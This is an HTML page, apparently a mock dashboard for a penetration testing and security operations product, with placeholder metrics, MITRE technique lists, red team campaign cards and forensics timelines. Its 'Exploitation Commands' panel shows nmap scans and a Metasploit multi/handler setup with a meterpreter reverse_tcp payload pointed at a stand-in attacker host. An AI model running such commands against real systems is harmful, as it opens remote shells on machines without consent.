@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberShield Pro - Advanced Penetration Testing Framework</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>CyberShield Pro</span>
+                </div>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#dashboard" class="nav-link active" data-module="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a></li>
+                <li><a href="#threat-intel" class="nav-link" data-module="threat-intel"><i class="fas fa-brain"></i> AI Threat Intel</a></li>
+                <li><a href="#pentest" class="nav-link" data-module="pentest"><i class="fas fa-crosshairs"></i> Penetration Testing</a></li>
+                <li><a href="#redteam" class="nav-link" data-module="redteam"><i class="fas fa-user-ninja"></i> Red Team Ops</a></li>
+                <li><a href="#ml-analytics" class="nav-link" data-module="ml-analytics"><i class="fas fa-chart-line"></i> ML Analytics</a></li>
+                <li><a href="#cloud-security" class="nav-link" data-module="cloud-security"><i class="fas fa-cloud-upload-alt"></i> Cloud Security</a></li>
+                <li><a href="#forensics" class="nav-link" data-module="forensics"><i class="fas fa-search"></i> Digital Forensics</a></li>
+            </ul>
+            <div class="sidebar-footer">
+                <div class="user-info">
+                    <i class="fas fa-user-circle"></i>
+                    <span>Security Analyst</span>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="header">
+                <div class="header-left">
+                    <h1 id="page-title">Security Operations Dashboard</h1>
+                    <div class="breadcrumb">
+                        <span id="breadcrumb-text">Home / Dashboard</span>
+                    </div>
+                </div>
+                <div class="header-right">
+                    <div class="threat-level">
+                        <span class="threat-indicator high">THREAT LEVEL: HIGH</span>
+                    </div>
+                    <div class="last-updated">
+                        Last updated: <span id="last-updated"></span>
+                    </div>
+                    <button id="theme-toggle-btn" class="btn btn--outline btn--sm" title="Toggle theme"><i class="fas fa-moon"></i></button>
+                </div>
+            </header>
+
+            <!-- Dashboard Module -->
+            <div id="dashboard" class="module active">
+                <div class="metrics-grid">
+                    <div class="metric-card critical">
+                        <div class="metric-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                        <div class="metric-info">
+                            <h3>Open Vulnerabilities</h3>
+                            <div id="criticalVuln" class="metric-value">127</div>
+                            <div class="metric-change">+3 this week</div>
+                        </div>
+                    </div>
+                    <div class="metric-card success">
+                        <div class="metric-icon"><i class="fas fa-shield-check"></i></div>
+                        <div class="metric-info">
+                            <h3>Systems Secured</h3>
+                            <div id="systemsSecured" class="metric-value">1,847</div>
+                            <div class="metric-change">+12 today</div>
+                        </div>
+                    </div>
+                    <div class="metric-card warning">
+                        <div class="metric-icon"><i class="fas fa-chart-line"></i></div>
+                        <div class="metric-info">
+                            <h3>Threat Score</h3>
+                            <div id="threatScore" class="metric-value">7.8/10</div>
+                            <div class="metric-change">-0.3 from last week</div>
+                        </div>
+                    </div>
+                    <div class="metric-card info">
+                        <div class="metric-icon"><i class="fas fa-tasks"></i></div>
+                        <div class="metric-info">
+                            <h3>Compliance</h3>
+                            <div id="compliancePercent" class="metric-value">94%</div>
+                            <div class="metric-change">+2% improvement</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="dashboard-grid">
+                    <div class="dashboard-card">
+                        <div class="card-header">
+                            <h3>MITRE ATT&CK Techniques Detected</h3>
+                        </div>
+                        <div class="card-content">
+                            <canvas id="mitreChart" style="height:300px;"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-card">
+                        <div class="card-header">
+                            <h3>Vulnerability Distribution</h3>
+                        </div>
+                        <div class="card-content">
+                            <canvas id="vulnerabilityChart" style="height:300px;"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-card recent-activities">
+                        <div class="card-header">
+                            <h3>Recent Security Activities</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="activity-list">
+                                <div class="activity-item critical">
+                                    <div class="activity-icon"><i class="fas fa-exclamation-circle"></i></div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">Critical RCE vulnerability detected</div>
+                                        <div class="activity-meta">CVE-2024-1234 • 15 systems affected • 2 hours ago</div>
+                                    </div>
+                                </div>
+                                <div class="activity-item success">
+                                    <div class="activity-icon"><i class="fas fa-check-circle"></i></div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">SQL injection vulnerability patched</div>
+                                        <div class="activity-meta">CVE-2024-2345 • 3 systems • 4 hours ago</div>
+                                    </div>
+                                </div>
+                                <div class="activity-item warning">
+                                    <div class="activity-icon"><i class="fas fa-shield-alt"></i></div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">Penetration test initiated</div>
+                                        <div class="activity-meta">Target: Production Network • 6 hours ago</div>
+                                    </div>
+                                </div>
+                                <div class="activity-item info">
+                                    <div class="activity-icon"><i class="fas fa-robot"></i></div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">AI model training completed</div>
+                                        <div class="activity-meta">Zero-day detection model • 8 hours ago</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-card">
+                        <div class="card-header">
+                            <h3>Active Security Tools</h3>
+                            <span class="status-indicator online">5 Active</span>
+                        </div>
+                        <div class="card-content">
+                            <div class="tools-grid">
+                                <div class="tool-item">
+                                    <div class="tool-icon"><i class="fas fa-network-wired"></i></div>
+                                    <div class="tool-info">
+                                        <div class="tool-name">Nmap</div>
+                                        <div class="tool-status active">Active</div>
+                                    </div>
+                                </div>
+                                <div class="tool-item">
+                                    <div class="tool-icon"><i class="fas fa-crosshairs"></i></div>
+                                    <div class="tool-info">
+                                        <div class="tool-name">Metasploit</div>
+                                        <div class="tool-status active">Active</div>
+                                    </div>
+                                </div>
+                                <div class="tool-item">
+                                    <div class="tool-icon"><i class="fas fa-bug"></i></div>
+                                    <div class="tool-info">
+                                        <div class="tool-name">Burp Suite</div>
+                                        <div class="tool-status active">Active</div>
+                                    </div>
+                                </div>
+                                <div class="tool-item">
+                                    <div class="tool-icon"><i class="fas fa-brain"></i></div>
+                                    <div class="tool-info">
+                                        <div class="tool-name">Custom AI Scanner</div>
+                                        <div class="tool-status active">Active</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-card full-width">
+                        <div class="card-header">
+                            <h3>2025 Cybersecurity Skills Growth Analysis</h3>
+                            <div class="card-subtitle">Industry demand based on 457,398+ job postings</div>
+                        </div>
+                        <div class="card-content">
+                            <img src="assets/cybersecurity_skills_growth.png" alt="Cybersecurity Skills Growth Analysis" class="skills-chart">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- AI Threat Intelligence Module -->
+            <div id="threat-intel" class="module">
+                <div class="module-header">
+                    <h2>AI-Powered Threat Intelligence</h2>
+                    <div class="module-actions">
+                        <button class="btn btn--primary"><i class="fas fa-sync"></i> Refresh Intelligence</button>
+                        <button class="btn btn--outline">Generate Report</button>
+                    </div>
+                </div>
+                <div class="threat-intel-grid">
+                    <div class="threat-card">
+                        <div class="card-header">
+                            <h3>AI Threat Prediction Model</h3>
+                            <div class="model-status active">Model Status: Active</div>
+                        </div>
+                        <div class="card-content">
+                            <div class="prediction-metrics">
+                                <div class="prediction-item"><span class="label">Accuracy Rate:</span><span class="value">94.7%</span></div>
+                                <div class="prediction-item"><span class="label">False Positives:</span><span class="value">2.3%</span></div>
+                                <div class="prediction-item"><span class="label">Model Version:</span><span class="value">v2.4.1</span></div>
+                            </div>
+                            <div class="code-preview">
+                                <pre><code># AI Threat Detection Model
+import tensorflow as tf
+import numpy as np
+
+class ThreatDetectionModel:
+    def __init__(self):
+        self.model = tf.keras.Sequential([
+            tf.keras.layers.Dense(128, activation='relu'),
+            tf.keras.layers.Dropout(0.3),
+            tf.keras.layers.Dense(64, activation='relu'),
+            tf.keras.layers.Dense(1, activation='sigmoid')
+        ])
+        
+    def predict_threat(self, network_data):
+        return self.model.predict(network_data)</code></pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="threat-card">
+                        <div class="card-header">
+                            <h3>MITRE ATT&CK Mapping</h3>
+                            <button class="btn btn--outline btn--sm">Full Matrix</button>
+                        </div>
+                        <div class="card-content">
+                            <div class="mitre-techniques">
+                                <div class="technique-item high"><div class="technique-id">T1566</div><div class="technique-name">Phishing</div><div class="detection-count">23 detections</div></div>
+                                <div class="technique-item medium"><div class="technique-id">T1003</div><div class="technique-name">Credential Dumping</div><div class="detection-count">12 detections</div></div>
+                                <div class="technique-item medium"><div class="technique-id">T1055</div><div class="technique-name">Process Injection</div><div class="detection-count">8 detections</div></div>
+                                <div class="technique-item low"><div class="technique-id">T1090</div><div class="technique-name">Proxy</div><div class="detection-count">5 detections</div></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Penetration Testing Module -->
+            <div id="pentest" class="module">
+                <div class="module-header">
+                    <h2>Automated Penetration Testing Suite</h2>
+                    <div class="module-actions">
+                        <button class="btn btn--primary"><i class="fas fa-play"></i> Start Scan</button>
+                        <button class="btn btn--outline">View Reports</button>
+                    </div>
+                </div>
+                <div class="pentest-workflow">
+                    <div class="workflow-steps">
+                        <div class="step active"><div class="step-number">1</div><div class="step-title">OSINT Gathering</div><div class="step-status">Completed</div></div>
+                        <div class="step active"><div class="step-number">2</div><div class="step-title">Network Discovery</div><div class="step-status">Completed</div></div>
+                        <div class="step current"><div class="step-number">3</div><div class="step-title">Vulnerability Scanning</div><div class="step-status">In Progress</div></div>
+                        <div class="step"><div class="step-number">4</div><div class="step-title">Exploitation</div><div class="step-status">Pending</div></div>
+                        <div class="step"><div class="step-number">5</div><div class="step-title">Post-Exploitation</div><div class="step-status">Pending</div></div>
+                    </div>
+                    <div class="pentest-results">
+                        <div class="result-card">
+                            <h3>Vulnerability Findings</h3>
+                            <div class="vuln-list">
+                                <div class="vuln-item critical"><div class="vuln-severity">CRITICAL</div><div class="vuln-details"><div class="vuln-title">Remote Code Execution</div><div class="vuln-id">CVE-2024-1234</div><div class="vuln-score">CVSS: 9.8</div></div></div>
+                                <div class="vuln-item high"><div class="vuln-severity">HIGH</div><div class="vuln-details"><div class="vuln-title">Authentication Bypass</div><div class="vuln-id">CVE-2024-4567</div><div class="vuln-score">CVSS: 7.9</div></div></div>
+                                <div class="vuln-item medium"><div class="vuln-severity">MEDIUM</div><div class="vuln-details"><div class="vuln-title">Cross-Site Scripting</div><div class="vuln-id">CVE-2024-3456</div><div class="vuln-score">CVSS: 6.2</div></div></div>
+                            </div>
+                        </div>
+                        <div class="result-card">
+                            <h3>Exploitation Commands</h3>
+                            <div class="code-preview"><pre><code># Automated Exploitation Script
+#!/bin/bash
+nmap -sS -O -A target_network/24
+nmap --script vuln target_ip
+msfconsole -q -x "\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444\nexploit -j\n"
+python3 custom_exploit.py --target target_ip --port 80</code></pre></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Red Team Operations Module -->
+            <div id="redteam" class="module">
+                <div class="module-header"><h2>Red Team Operations Center</h2><div class="module-actions"><button class="btn btn--primary"><i class="fas fa-rocket"></i> Launch Campaign</button><button class="btn btn--outline">View Operations</button></div></div>
+                <div class="redteam-dashboard">
+                    <div class="campaign-card active-campaign">
+                        <div class="campaign-header"><h3>Operation: Shadow Storm</h3><div class="campaign-status">Active</div></div>
+                        <div class="campaign-progress"><div class="progress-bar"><div class="progress-fill" style="width:65%"></div></div><span>65% Complete</span></div>
+                        <div class="campaign-metrics"><div class="metric"><span class="label">Compromised Systems:</span><span class="value">7/12</span></div><div class="metric"><span class="label">Data Exfiltrated:</span><span class="value">2.4 GB</span></div><div class="metric"><span class="label">Persistence Established:</span><span class="value">4 Hosts</span></div></div>
+                    </div>
+                    <div class="tactics-grid">
+                        <div class="tactic-card"><h4>Initial Access</h4><div class="tactic-methods"><div class="method completed">Spear Phishing</div><div class="method completed">USB Drop</div><div class="method pending">Watering Hole</div></div></div>
+                        <div class="tactic-card"><h4>Privilege Escalation</h4><div class="tactic-methods"><div class="method completed">DLL Hijacking</div><div class="method active">Token Impersonation</div><div class="method pending">Kernel Exploit</div></div></div>
+                        <div class="tactic-card"><h4>Defense Evasion</h4><div class="tactic-methods"><div class="method completed">Process Hollowing</div><div class="method active">AV Bypass</div><div class="method pending">Rootkit Installation</div></div></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ML Analytics Module -->
+            <div id="ml-analytics" class="module">
+                <div class="module-header"><h2>Machine Learning Security Analytics</h2><div class="module-actions"><button class="btn btn--primary"><i class="fas fa-brain"></i> Train Model</button><button class="btn btn--outline">Export Data</button></div></div>
+                <div class="ml-dashboard">
+                    <div class="model-cards">
+                        <div class="model-card"><h3>Behavioral Anomaly Detection</h3><div class="model-stats"><div class="stat"><span class="label">Accuracy:</span><span class="value">96.2%</span></div><div class="stat"><span class="label">Training Time:</span><span class="value">2h 34m</span></div><div class="stat"><span class="label">Last Updated:</span><span class="value">2 hours ago</span></div></div><div class="model-performance"><canvas id="mlChart" style="height:200px;"></canvas></div></div>
+                        <div class="model-card"><h3>Malware Classification Model</h3><div class="classification-results"><div class="classification-item"><span class="malware-type">Trojan</span><span class="confidence">94.7%</span></div><div class="classification-item"><span class="malware-type">Ransomware</span><span class="confidence">89.3%</span></div><div class="classification-item"><span class="malware-type">Spyware</span><span class="confidence">91.8%</span></div><div class="classification-item"><span class="malware-type">Rootkit</span><span class="confidence">87.5%</span></div></div></div>
+                    </div>
+                    <div class="training-data-card"><h3>Training Dataset Management</h3><div class="dataset-info"><div class="dataset-stat"><span class="label">Total Samples:</span><span class="value">1,247,892</span></div><div class="dataset-stat"><span class="label">Labeled Data:</span><span class="value">892,456</span></div><div class="dataset-stat"><span class="label">Feature Dimensions:</span><span class="value">1,024</span></div></div></div>
+                </div>
+            </div>
+
+            <!-- Cloud Security Module -->
+            <div id="cloud-security" class="module">
+                <div class="module-header"><h2>Cloud Security Assessment</h2><div class="module-actions"><button class="btn btn--primary"><i class="fas fa-cloud"></i> Scan Infrastructure</button><button class="btn btn--outline">View Compliance</button></div></div>
+                <div class="cloud-dashboard">
+                    <div class="cloud-providers">
+                        <div class="provider-card aws"><div class="provider-logo">AWS</div><div class="provider-status"><div class="status-item"><span class="label">Security Score:</span><span class="value">8.2/10</span></div><div class="status-item"><span class="label">Compliance:</span><span class="value">94%</span></div></div></div>
+                        <div class="provider-card azure"><div class="provider-logo">Azure</div><div class="provider-status"><div class="status-item"><span class="label">Security Score:</span><span class="value">7.8/10</span></div><div class="status-item"><span class="label">Compliance:</span><span class="value">89%</span></div></div></div>
+                        <div class="provider-card gcp"><div class="provider-logo">GCP</div><div class="provider-status"><div class="status-item"><span class="label">Security Score:</span><span class="value">8.5/10</span></div><div class="status-item"><span class="label">Compliance:</span><span class="value">92%</span></div></div></div>
+                    </div>
+                    <div class="infrastructure-scan"><h3>Infrastructure as Code (IaC) Security</h3><div class="scan-results"><div class="code-preview"><pre><code># Terraform Security Scan Results
+resource "aws_s3_bucket" "data_bucket" {
+  bucket = "my-secure-data-bucket"
+  # ✗ CRITICAL: Bucket allows public read access
+  public_read_acl = true  # SECURITY RISK
+  # ✓ GOOD: Encryption enabled
+  server_side_encryption_configuration {
+    rule { apply_server_side_encryption_by_default { sse_algorithm = "AES256" } }
+  }
+  # ✗ MEDIUM: Versioning not enabled
+}
+# Security Issues Found: 2 (Critical:1, Medium:1)
+</code></pre></div></div></div>
+                </div>
+            </div>
+
+            <!-- Digital Forensics Module -->
+            <div id="forensics" class="module">
+                <div class="module-header"><h2>Digital Forensics & Incident Response</h2><div class="module-actions"><button class="btn btn--primary"><i class="fas fa-search-plus"></i> Start Investigation</button><button class="btn btn--outline">Generate Timeline</button></div></div>
+                <div class="forensics-dashboard">
+                    <div class="incident-timeline"><h3>Incident Timeline - Case #2024-0157</h3><div class="timeline"><div class="timeline-item critical"><div class="timeline-time">14:32:15</div><div class="timeline-content"><div class="timeline-title">Malicious File Detected</div><div class="timeline-detail">suspicious.exe executed on WORKSTATION-01</div></div></div><div class="timeline-item warning"><div class="timeline-time">14:35:22</div><div class="timeline-content"><div class="timeline-title">Network Connection Established</div><div class="timeline-detail">Outbound connection to 185.234.72.88:4444</div></div></div><div class="timeline-item info"><div class="timeline-time">14:38:45</div><div class="timeline-content"><div class="timeline-title">Data Exfiltration Attempt</div><div class="timeline-detail">Large file transfer detected - 2.3GB</div></div></div></div></div>
+                    <div class="evidence-analysis"><h3>Digital Evidence Analysis</h3><div class="evidence-grid"><div class="evidence-item"><div class="evidence-type">File Hash</div><div class="evidence-value">a1b2c3d4e5f6...</div><div class="evidence-status malicious">Malicious</div></div><div class="evidence-item"><div class="evidence-type">IP Address</div><div class="evidence-value">185.234.72.88</div><div class="evidence-status suspicious">Suspicious</div></div><div class="evidence-item"><div class="evidence-type">Registry Key</div><div class="evidence-value">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="evidence-status modified">Modified</div></div></div></div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="js/app.js"></script>
+</body>
+</html>
